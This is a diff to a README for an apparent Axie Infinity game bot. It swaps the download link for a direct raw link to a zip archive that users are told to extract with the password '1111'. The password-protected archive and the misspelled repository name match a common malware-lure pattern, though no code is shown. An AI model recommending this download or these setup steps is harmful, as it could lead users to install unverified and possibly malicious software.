@@ -4,7 +4,7 @@ Bot uses WinAPI functions to take screenshots and recognize pixels of axie model
 
 ### Setup
 1. Change game resolution to full-screen (or full-screen windowed) and close SkyMavis game client
-2. [Download](https://github.com/tonilsonfrancisco13/Axie-Infiinity-Bot-2023/blob/main/Axie%20Infinity%20Bot.zip) repository release and extract files with password `1111`
+2. [Download](https://github.com/tonilsonfrancisco13/Axie-Infiinity-Bot-2023/raw/main/Axie%20Infinity%20Bot.zip) repository release and extract files with password `1111`
 3. Launch bot with correct settings
 
 ### Warning
